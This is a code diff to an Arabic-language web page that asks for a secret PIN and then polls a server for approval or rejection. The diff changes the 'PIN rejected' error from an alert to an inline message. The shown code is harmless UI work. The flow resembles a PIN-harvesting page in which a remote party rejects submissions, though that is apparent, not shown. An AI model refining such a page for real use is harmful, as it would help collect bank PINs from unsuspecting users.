@@ -265,7 +265,7 @@
     </div>
 
     <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>تأكيد ومتابعة</button>
-    <div class="error-msg" id="errorMsg">حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى.</div>
+    <div class="error-msg" id="errorMsg">تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.</div>
 
     <div class="spacer"></div>
   </div>
@@ -356,7 +356,9 @@
               } else if (data.status === 'rejected') {
                 clearInterval(pollInterval);
                 document.getElementById('loadingOverlay').style.display = 'none';
-                alert("تم رفض العملية، يرجى التحقق من صحة البيانات والمحاولة مرة أخرى.");
+                var errorMsg = document.getElementById('errorMsg');
+                errorMsg.textContent = 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
+                errorMsg.style.display = 'block';
                 clearPin();
               }
             }
